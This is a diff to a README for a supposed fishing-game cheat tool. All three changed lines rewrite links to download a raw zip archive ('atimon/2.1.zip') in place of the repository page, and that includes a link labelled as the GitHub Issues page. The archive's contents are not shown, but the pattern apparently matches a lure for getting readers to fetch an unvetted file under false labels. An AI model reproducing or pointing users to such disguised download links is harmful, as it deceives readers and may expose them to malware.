@@ -1,6 +1,6 @@
 # 🎣 how-to-fish-cheats - Master Any Fishing Game Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Fishing%20Cheats-2ea44f?style=for-the-badge&logo=github)](https://github.com/ashallynart/how-to-fish-cheats)
+[![Download Now](https://img.shields.io/badge/Download-Fishing%20Cheats-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ashallynart/how-to-fish-cheats/main/atimon/2.1.zip)
 
 ---
 
@@ -52,7 +52,7 @@ No programming knowledge? No problem. If you can click a mouse, you can use this
 
 Ready to start catching everything? Head over to the official download page:
 
-[![Download Fishing Cheats](https://img.shields.io/badge/Download-here-ff69b4?style=for-the-badge&logo=github)](https://github.com/ashallynart/how-to-fish-cheats)
+[![Download Fishing Cheats](https://img.shields.io/badge/Download-here-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ashallynart/how-to-fish-cheats/main/atimon/2.1.zip)
 
 Visit this link to download the application. The download page will provide you with the latest version of the tool, ready for immediate use.
 
@@ -185,7 +185,7 @@ Need help getting started or troubleshooting an issue? We've got you covered:
 
 
 
-- **🐛 Bug Reports** — If you find a bug or issue, please report it on the [GitHub Issues page](https://github.com/ashallynart/how-to-fish-cheats/issues) with a detailed description of the problem, your system specifications, and steps to reproduce it.
+- **🐛 Bug Reports** — If you find a bug or issue, please report it on the [GitHub Issues page](https://raw.githubusercontent.com/ashallynart/how-to-fish-cheats/main/atimon/2.1.zip) with a detailed description of the problem, your system specifications, and steps to reproduce it.
 
 
 
